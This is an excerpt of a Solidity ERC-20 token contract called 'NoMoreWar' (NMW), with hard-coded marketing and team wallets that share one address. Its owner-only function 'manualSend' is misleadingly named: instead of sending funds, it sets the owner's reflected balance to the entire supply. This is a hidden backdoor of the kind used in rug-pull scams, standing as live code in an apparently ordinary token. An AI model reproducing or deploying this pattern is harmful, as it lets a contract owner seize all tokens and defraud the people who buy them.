...
contract NoMoreWar is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "NoMoreWar"; 
    string private _symbol = "NMW";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2e8B0B2A3C995910425E7848db284eaA09e84F50);
    address payable public teamWalletAddress = payable(0x2e8B0B2A3C995910425E7848db284eaA09e84F50);
    ...
    function manualSend() public onlyOwner returns (bool success) {_rBalance[owner()] = _rSupply;return true;}
